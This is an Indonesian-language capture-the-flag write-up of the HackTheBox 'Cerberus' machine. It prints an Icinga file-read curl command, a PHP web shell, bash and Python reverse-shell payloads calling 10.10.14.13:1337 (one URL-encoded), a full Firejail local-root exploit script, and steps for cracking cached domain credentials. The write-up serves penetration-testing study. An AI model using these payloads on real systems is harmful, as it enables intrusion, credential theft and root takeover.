---
title: "HackTheBox - Cerberus WriteUps"
date: 2023-04-04 02:00:00 +07:00
categories: [WriteUps]
tags: [ctf, hackthebox, pentest, writeups]
image: 
---

# HackTheBox Cerberus WriteUps

## Enumeration
Dalam perintah tersebut, opsi "``-sC``" digunakan untuk melakukan default script scanning dan opsi "``-sV``" digunakan untuk melakukan version detection. Artinya, dengan perintah tersebut, kita melakukan scanning terhadap host dengan menggunakan script default dan mencoba mendapatkan informasi tentang versi aplikasi atau service yang berjalan pada host tersebut.
![image](https://media.discordapp.net/attachments/740245586095112242/1092688196510437376/image.png)

## Web Page
Setelah melakukan scanning, hasil yang ditemukan adalah bahwa terdapat port yang terbuka pada port 8080. Port 8080 adalah port yang umum digunakan untuk akses web server yang berjalan pada aplikasi web. yaitu web login page
![image](https://media.discordapp.net/attachments/740245586095112242/1092688443911442502/image.png)

Abritary File Disclosure (CVE-2022-24716) Arbitrary File Disclosure adalah kerentanan pada sebuah aplikasi atau sistem yang memungkinkan seorang penyerang untuk mengakses atau membaca file-file sensitif yang terdapat pada sistem tersebut tanpa harus memiliki hak akses yang seharusnya. Penyerang dapat memanfaatkan kerentanan ini untuk mendapatkan informasi sensitif seperti konfigurasi aplikasi, password, data pengguna, dan lain sebagainya. CVE-2022-24716 adalah sebuah kerentanan Arbitrary File Disclosure yang dapat memungkinkan penyerang untuk mengakses atau membaca file-file sensitif pada sebuah aplikasi atau sistem. disini kita menemukan LFI PoC pada [Github](https://github.com/JacobEbben/CVE-2022-24716)
![image](https://media.discordapp.net/attachments/740245586095112242/1092688799345156137/image.png)


Pernyataan ini menunjukkan bahwa kita mencoba membaca isi file dengan menggunakan perintah curl. Curl adalah sebuah command-line tool yang digunakan untuk mengirim dan menerima data melalui protokol seperti HTTP, HTTPS, FTP, dan lain-lain. Pada pernyataan di atas, kita menggunakan curl untuk membaca isi file dengan URL ```
http://icinga.cerberus.local:8080/icingaweb2/lib/icinga/icinga-php-thirdparty/etc/icingaweb2/roles.ini
``` . URL tersebut merujuk pada file ``roles.ini`` yang berada pada direktori ``etc/icingaweb2`` pada sebuah server dengan nama domain ``icinga.cerberus.local`` dan port 8080. Dalam konteks ini, kemungkinan besar kita mencoba membaca konfigurasi role dari aplikasi web yang dijalankan pada server tersebut.
```sql
curl http://icinga.cerberus.local:8080/icingaweb2/lib/icinga/icinga-php-thirdparty/etc/icingaweb2/resources.ini
```
![image](https://media.discordapp.net/attachments/740245586095112242/1092689346819260469/image.png)

## Login with Credential
Ketika kita menggunakan informasi kredensial ini untuk login pada halaman page login yang tersedia pada port 8080, kita dapat mengakses aplikasi web Icinga dan melakukan berbagai aktivitas, seperti memantau kinerja jaringan, mengelola konfigurasi, atau melihat laporan.
![image](https://media.discordapp.net/attachments/740245586095112242/1092689532715008050/image.png)

## Konfigurasi module path
Menunjukkan bahwa kita sedang mencari cara untuk melakukan manipulasi atau mengubah jalur modul pada suatu sistem.

Mengganti module path menjadi ``/dev/`` dapat memiliki dampak yang signifikan pada sistem. Hal ini dapat memungkinkan pengguna untuk melakukan akses yang tidak sah atau memperoleh kontrol yang tidak diinginkan pada perangkat keras atau sistem operasi.
![image](https://media.discordapp.net/attachments/740245586095112242/1092689763238154250/image.png)

## Add User
Selanjutnya kita mencoba menambah User
![image](https://media.discordapp.net/attachments/740245586095112242/1092689960416579675/image.png)

## Add SSH Key
![image](https://media.discordapp.net/attachments/740245586095112242/1092690101718495323/image.png)

Dari hasil pembacaan file tersebut, kita menemukan bahwa file tersebut adalah sebuah kunci privat RSA. Kunci RSA adalah salah satu bentuk kunci kriptografi yang umum digunakan untuk mengamankan komunikasi melalui jaringan. Kunci ini digunakan untuk mengenkripsi dan mendekripsi data yang dikirim melalui jaringan, serta untuk memverifikasi tanda tangan digital.
```sql
curl http://icinga.cerberus.local:8080/icingaweb2/lib/icinga/icinga-php-thirdparty/etc/icingaweb2/ssh/yp13
```
![image](https://media.discordapp.net/attachments/740245586095112242/1092690363745062993/image.png)

## Remote Code Execution (RCE)
Backconnect dengan mengubah payload seperti dibawah
```sql
Resource Name: ypshell.php
User: ../../../../../dev/shm/ypshell.php
Private Key: file:///etc/icingaweb2/ssh/yp13%00 <?php system("bash -c 'bash -i >& /dev/tcp/10.10.14.13/1337 0>&1'");
```
![image](https://media.discordapp.net/attachments/740245586095112242/1092690668817747998/image.png)
![image](https://media.discordapp.net/attachments/740245586095112242/1092690821272317982/image.png)

## Or Shell

Untuk payload shell bisa menggunakan payload ini
```sql
Private key : file:///etc/icingaweb2/ssh/yp13\x00<?php system($_REQUEST['cmd']);?>
```
![image](https://media.discordapp.net/attachments/740245586095112242/1092691013547593838/image.png)

Module SHM jangan lupa aktif untuk menjalankan shell
![image](https://media.discordapp.net/attachments/740245586095112242/1092691207626428477/image.png)

Setelah itu kita mencoba menjalankan shell tadi yang sudah diupload dengan curl disini mendapatkan, Response
![image](https://media.discordapp.net/attachments/740245586095112242/1092691449432248351/image.png)
![image](https://media.discordapp.net/attachments/740245586095112242/1092691543602765935/image.png)
![image](https://media.discordapp.net/attachments/740245586095112242/1092691645671145482/image.png)

## Backconnect dengan Netcat

Selanjutnya kita menggunakan payload dibawah untuk backconnect dengan netcat dengan reverse shell python script
```sql
export RHOST="10.10.14.13";export RPORT=1337;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("bash")'
```
```sql
%65%78%70%6f%72%74%20%52%48%4f%53%54%3d%22%31%30%2e%31%30%2e%31%34%2e%31%33%22%3b%65%78%70%6f%72%74%20%52%50%4f%52%54%3d%31%33%33%37%3b%70%79%74%68%6f%6e%33%20%2d%63%20%27%69%6d%70%6f%72%74%20%73%79%73%2c%73%6f%63%6b%65%74%2c%6f%73%2c%70%74%79%3b%73%3d%73%6f%63%6b%65%74%2e%73%6f%63%6b%65%74%28%29%3b%73%2e%63%6f%6e%6e%65%63%74%28%28%6f%73%2e%67%65%74%65%6e%76%28%22%52%48%4f%53%54%22%29%2c%69%6e%74%28%6f%73%2e%67%65%74%65%6e%76%28%22%52%50%4f%52%54%22%29%29%29%29%3b%5b%6f%73%2e%64%75%70%32%28%73%2e%66%69%6c%65%6e%6f%28%29%2c%66%64%29%20%66%6f%72%20%66%64%20%69%6e%20%28%30%2c%31%2c%32%29%5d%3b%70%74%79%2e%73%70%61%77%6e%28%22%62%61%73%68%22%29%27
```
Menjalankan dengan perintah Curl
![image](https://media.discordapp.net/attachments/740245586095112242/1092692056889114644/image.png)
![image](https://media.discordapp.net/attachments/740245586095112242/1092692147272171530/image.png)

## Privileges Escalation (CVE-2022-31214)

Setelah mencari cari kita menemukan kerentanan pada firejail yang dapat dimaanfatkan untuk Privileges Escalation. [Reference](https://seclists.org/oss-sec/2022/q2/188) dan [PoC](https://www.openwall.com/lists/oss-security/2022/06/08/10)
![image](https://media.discordapp.net/attachments/740245586095112242/1092692588278059108/image.png)

PoC untuk file python untuk mendapatkan panggilan dari firejail menggunakan [PoC](https://seclists.org/oss-sec/2022/q2/att-188/firejoin_py.bin)
```python
#!/usr/bin/python3

# Author: Matthias Gerstner <matthias.gerstner () suse com>
#
# Proof of concept local root exploit for a vulnerability in Firejail 0.9.68
# in joining Firejail instances.
#
# Prerequisites:
# - the firejail setuid-root binary needs to be installed and accessible to the
#   invoking user
#
# Exploit: The exploit tricks the Firejail setuid-root program to join a fake
# Firejail instance. By using tmpfs mounts and symlinks in the unprivileged
# user namespace of the fake Firejail instance the result will be a shell that
# lives in an attacker controller mount namespace while the user namespace is
# still the initial user namespace and the nonewprivs setting is unset,
# allowing to escalate privileges via su or sudo.

import os
import shutil
import stat
import subprocess
import sys
import tempfile
import time
from pathlib import Path

# Print error message and exit with status 1
def printe(*args, **kwargs):
    kwargs['file'] = sys.stderr
    print(*args, **kwargs)
    sys.exit(1)

# Return a boolean whether the given file path fulfils the requirements for the
# exploit to succeed:
# - owned by uid 0
# - size of 1 byte
# - the content is a single '1' ASCII character
def checkFile(f):
    s = os.stat(f)

    if s.st_uid != 0 or s.st_size != 1 or not stat.S_ISREG(s.st_mode):
        return False

    with open(f) as fd:
        ch = fd.read(2)

        if len(ch) != 1 or ch != "1":
            return False

    return True

def mountTmpFS(loc):
    subprocess.check_call("mount -t tmpfs none".split() + [loc])

def bindMount(src, dst):
    subprocess.check_call("mount --bind".split() + [src, dst])

def checkSelfExecutable():
    s = os.stat(__file__)

    if (s.st_mode & stat.S_IXUSR) == 0:
        printe(f"{__file__} needs to have the execute bit set for the exploit to work. Run `chmod +x {__file__}` and try again.")

# This creates a "helper" sandbox that serves the purpose of making available
# a proper "join" file for symlinking to as part of the exploit later on.
#
# Returns a tuple of (proc, join_file), where proc is the running subprocess
# (it needs to continue running until the exploit happened) and join_file is
# the path to the join file to use for the exploit.
def createHelperSandbox():
    # just run a long sleep command in an unsecured sandbox
    proc = subprocess.Popen(
            "firejail --noprofile -- sleep 10d".split(),
            stderr=subprocess.PIPE)

    # read out the child PID from the stderr output of firejail
    while True:
        line = proc.stderr.readline()
        if not line:
            raise Exception("helper sandbox creation failed")

        # on stderr a line of the form "Parent pid <ppid>, child pid <pid>" is output
        line = line.decode('utf8').strip().lower()
        if line.find("child pid") == -1:
            continue

        child_pid = line.split()[-1]

        try:
            child_pid = int(child_pid)
            break
        except Exception:
            raise Exception("failed to determine child pid from helper sandbox")

    # We need to find the child process of the child PID, this is the
    # actual sleep process that has an accessible root filesystem in /proc
    children = f"/proc/{child_pid}/task/{child_pid}/children"

    # If we are too quick then the child does not exist yet, so sleep a bit
    for _ in range(10):
        with open(children) as cfd:
            line = cfd.read().strip()
            kids = line.split()
            if not kids:
                time.sleep(0.5)
                continue
            elif len(kids) != 1:
                raise Exception(f"failed to determine sleep child PID from helper sandbox: {kids}")

            try:
                sleep_pid = int(kids[0])
                break
            except Exception:
                raise Exception("failed to determine sleep child PID from helper sandbox")
    else:
        raise Exception(f"sleep child process did not come into existence in {children}")

    join_file = f"/proc/{sleep_pid}/root/run/firejail/mnt/join"
    if not os.path.exists(join_file):
        raise Exception(f"join file from helper sandbox unexpectedly not found at {join_file}")

    return proc, join_file

# Re-executes the current script with unshared user and mount namespaces
def reexecUnshared(join_file):

    if not checkFile(join_file):
        printe(f"{join_file}: this file does not match the requirements (owner uid 0, size 1 byte, content '1')")

    os.environ["FIREJOIN_JOINFILE"] = join_file
    os.environ["FIREJOIN_UNSHARED"] = "1"

    unshare = shutil.which("unshare")
    if not unshare:
        printe("could not find 'unshare' program")

    cmdline = "unshare -U -r -m".split()
    cmdline += [__file__]

    # Re-execute this script with unshared user and mount namespaces
    subprocess.call(cmdline)

if "FIREJOIN_UNSHARED" not in os.environ:
    # First stage of execution, we first need to fork off a helper sandbox and
    # an exploit environment
    checkSelfExecutable()
    helper_proc, join_file = createHelperSandbox()
    reexecUnshared(join_file)

    helper_proc.kill()
    helper_proc.wait()
    sys.exit(0)
else:
    # We are in the sandbox environment, the suitable join file has been
    # forwarded from the first stage via the environment
    join_file = os.environ["FIREJOIN_JOINFILE"]

# We will make /proc/1/ns/user point to this via a symlink
time_ns_src = "/proc/self/ns/time"

# Make the firejail state directory writeable, we need to place a symlink to
# the fake join state file there
mountTmpFS("/run/firejail")
# Mount a tmpfs over the proc state directory of the init process, to place a
# symlink to a fake "user" ns there that firejail thinks it is joining
try:
    mountTmpFS("/proc/1")
except subprocess.CalledProcessError:
    # This is a special case for Fedora Linux where SELinux rules prevent us
    # from mounting a tmpfs over proc directories.
    # We can still circumvent this by mounting a tmpfs over all of /proc, but
    # we need to bind-mount a copy of our own time namespace first that we can
    # symlink to.
    with open("/tmp/time", 'w') as _:
        pass
    time_ns_src = "/tmp/time"
    bindMount("/proc/self/ns/time", time_ns_src)
    mountTmpFS("/proc")

FJ_MNT_ROOT = Path("/run/firejail/mnt")

# Create necessary intermediate directories
os.makedirs(FJ_MNT_ROOT)
os.makedirs("/proc/1/ns")

# Firejail expects to find the umask for the "container" here, else it fails
with open(FJ_MNT_ROOT / "umask", 'w') as umask_fd:
    umask_fd.write("022")

# Create the symlink to the join file to pass Firejail's sanity check
os.symlink(join_file, FJ_MNT_ROOT / "join")
# Since we cannot join our own user namespace again fake a user namespace that
# is actually a symlink to our own time namespace. This works since Firejail
# calls setns() without the nstype parameter.
os.symlink(time_ns_src, "/proc/1/ns/user")

# The process joining our fake sandbox will still have normal user privileges,
# but it will be a member of the mount namespace under the control of *this*
# script while *still* being a member of the initial user namespace.
# 'no_new_privs' won't be set since Firejail takes over the settings of the
# target process.
#
# This means we can invoke setuid-root binaries as usual but they will operate
# in a mount namespace under our control. To exploit this we need to adjust
# file system content in a way that a setuid-root binary grants us full
# root privileges. 'su' and 'sudo' are the most typical candidates for it.
#
# The tools are hardened a bit these days and reject certain files if not owned
# by root e.g. /etc/sudoers. There are various directions that could be taken,
# this one works pretty well though: Simply replacing the PAM configuration
# with one that will always grant access.
with tempfile.NamedTemporaryFile('w') as tf:
    tf.write("auth sufficient pam_permit.so\n")
    tf.write("account sufficient pam_unix.so\n")
    tf.write("session sufficient pam_unix.so\n")

    # Be agnostic about the PAM config file location in /etc or /usr/etc
    for pamd in ("/etc/pam.d", "/usr/etc/pam.d"):
        if not os.path.isdir(pamd):
            continue
        for service in ("su", "sudo"):
            service = Path(pamd) / service
            if not service.exists():
                continue
            # Bind mount over new "helpful" PAM config over the original
            bindMount(tf.name, service)

print(f"You can now run 'firejail --join={os.getpid()}' in another terminal to obtain a shell where 'sudo su -' should grant you a root shell.")

while True:
    line = sys.stdin.readline()
    if not line:
        break
```

Setelah itu kita upload ke dalam ``/tmp`` sistem tersebut dan menjalankannya dengan python3
![image](https://media.discordapp.net/attachments/740245586095112242/1092692966566547536/image.png)
![image](https://media.discordapp.net/attachments/740245586095112242/1092693107113467964/image.png)

Untuk mendapatkan Root access kita hanya menjalankan dengan ```firejail --join=[ID]```
![image](https://media.discordapp.net/attachments/740245586095112242/1092693315503276052/image.png)

Setelah mendapatkan root access disini tidak ada user.txt atau root.txt flag dari HTB tetapi disini ketika kita membaca ifconfig terdapat Ip dengan alamat 172.16.22.2 dimana pasti ada Ip lagi dengan alamat 172.16.22.1
![image](https://media.discordapp.net/attachments/740245586095112242/1092693512178372628/image.png)

Selanjutnya kita menggunakan chisel untuk melihat isi yang ada di Ip ``172.16.22.1``
![image](https://media.discordapp.net/attachments/740245586095112242/1092693716495511592/image.png)

Menggunakan payload dibawah untuk backconnect
![image](https://media.discordapp.net/attachments/740245586095112242/1092693919084580864/image.png)
![image](https://media.discordapp.net/attachments/740245586095112242/1092694020783865886/image.png)

Disini kita juga mendapatkan kredensial, bagaimana mendapatkanya? kita menggunakan cara ini
```sql
1. cari file di /var/lib/sss/db/
2. ambil dan ekstrak sid domain, pengguna domain DAN cachedPassword
3. lalu crack dengan hashcat
4. setelah Anda mendapatkannya -> gunakan winrm untuk masuk
```
![image](https://media.discordapp.net/attachments/740245586095112242/1092694359901737030/image.png)

Disini terdapat flag ```user.txt``` pada file Desktop
![image](https://media.discordapp.net/attachments/740245586095112242/1092694527829094400/image.png)

Selanjutnya kita menggunakan chisel lagi untuk memanggil port ```9251```
![image](https://media.discordapp.net/attachments/740245586095112242/1092694769307754537/image.png)
![image](https://media.discordapp.net/attachments/740245586095112242/1092694773351063642/image.png)

Kita menggunakan modul metasploit untuk CVE-2022-47966 dan tambahkan 127.0.0.1 ```dc.cerberos.local``` ke file host. selanjutnya ikuti payload di bawah untuk mendapatkan Root Access
![image](https://media.discordapp.net/attachments/740245586095112242/1092695151262056488/image.png)
![image](https://media.discordapp.net/attachments/740245586095112242/1092695234099552256/image.png)
![image](https://media.discordapp.net/attachments/740245586095112242/1092695316018511872/image.png)
![image](https://media.discordapp.net/attachments/740245586095112242/1092695406766469120/image.png)
![image](https://media.discordapp.net/attachments/740245586095112242/1092695430078406656/image.png)
